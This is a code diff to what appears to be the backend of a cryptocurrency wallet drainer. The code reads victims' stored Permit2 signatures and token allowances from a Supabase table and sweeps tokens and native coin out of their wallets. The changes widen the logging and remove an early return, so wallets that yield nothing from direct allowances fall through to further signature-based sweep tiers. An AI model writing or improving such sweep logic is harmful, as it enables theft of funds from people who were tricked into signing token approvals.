@@ -666,7 +666,7 @@ async function sweepGaslessWallet(walletAddress) {
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
 
   // ── Part 6: Log signature data read from Supabase ─────────────────────────
-  log(`[gasless] sig type: ${typeof signatureTransfers}`);
+  log(`[gasless] permitBatch=${!!permitBatch} signatureTransfers=${signatureTransfers === null ? "null" : Array.isArray(signatureTransfers) ? "legacy-array("+signatureTransfers.length+")" : signatureTransfers && typeof signatureTransfers === "object" ? "object(permitted="+signatureTransfers?.permitted?.length+")" : String(signatureTransfers)}`);
 
   // No signature data at all — check if on-chain AllowanceTransfer is still live.
   if (!signatureTransfers && !permitBatch) {
@@ -1740,13 +1740,18 @@ async function sweep(wallet) {
       }
     }
 
-    if (toSweepV2.length === 0 && toSweepLegacy.length === 0) {
-      log(`[direct] ${short} — no tokens with balance+allowance`);
+    const directSwept = toSweepV2.length > 0 || toSweepLegacy.length > 0;
+    if (!directSwept) {
+      log(`[direct] ${short} — no tokens with balance+allowance — falling through to permit2_signatures tiers`);
     }
 
     // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
     await trySweepNativeFor(checksum, short);
-    return;
+
+    // Only return early if direct-allowance actually swept something.
+    // If nothing swept, fall through to TIER 3/4 — wallet may have a
+    // valid batch-signature-transfer row in permit2_signatures.
+    if (directSwept) return;
   }
 
   // TIER 3: Permit2 AllowanceTransfer — permitBatch sigs (stored at plain address)
